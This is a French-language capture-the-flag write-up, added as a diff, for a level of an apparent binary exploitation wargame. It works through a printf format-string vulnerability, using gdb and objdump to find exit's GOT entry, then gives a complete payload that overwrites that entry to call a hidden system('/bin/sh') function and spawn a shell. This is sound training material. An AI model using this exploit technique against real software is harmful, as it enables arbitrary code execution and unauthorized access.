@@ -1,0 +1,90 @@
+### Level5
+
+En decompilant le code on remarque que la fonction o n'est jamais appele et que dans cette fonction
+il y a un appel a system("/bin/sh").
+
+Le but etant d'exploiter comme dans le level3 et 4 la fonction printf pour appeler la fonction o pour
+ouvrir un /bin/sh.
+
+On va commencer par localiser ou le printf ecrit dans la stack:
+
+	./level5
+	AAAA.%08X.%08X.%08X.%08X.%08X.%08X.%08X
+	AAAA.00000200.B7FD1AC0.B7FF37D0.41414141.3830252E.30252E58.252E5838
+
+Le printf ecrit donc a la 4eme position dans la stack.
+
+Mainteant on va exploiter une faille lie au GOT (Global Offset Table).
+Cette faille est lie au linkage de la libc.
+
+Quand on fait un gdb ./level5 puis un disas n:
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+
+Si on s'interesse a exit et q'on fait un disas exit:
+
+disas exit
+
+On obtient:
+
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838
+   0x080483d6 <+6>:	push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+
+La premiere ligne correspond a un jump sur une adresse (0x8049838).
+si on fait x 0x8049838 on obtient:
+
+0x8049838 <exit@got.plt>:	0x080483d6
+Qui est du coup la vrai adresse de la fonction exit dans la bibliotheque partage libc.
+
+On peut obtenir le meme resultat en faisant:
+objdump -R ./level5 qui nous donne:
+
+./level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+
+L'adresse qui pointe vers exit est donc: 0x8049838.
+
+Maintenant qu'on a l'adresse vers exit dans la memoire de notre programme on peut via printf remplacer son contenu par l'adresse de la fonction o.
+
+Pour avoir la fonction o on peut faire dans gdb print o qui nous donne:
+$1 = {<text variable, no debug info>} 0x80484a4 <o>
+
+Maintenant qu'on a l'adresse de exit, la postition de exit dans la stack et l'adresse de o on peut faire notre payload:
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'
+
+On le met dasn un fichier:
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/hack
+
+Ensuite on execute:
+cat /tmp/hack - | ./level5
+
+On obtiens un shell qui nous permet de faire un cd ../level6 puis un cat .pass
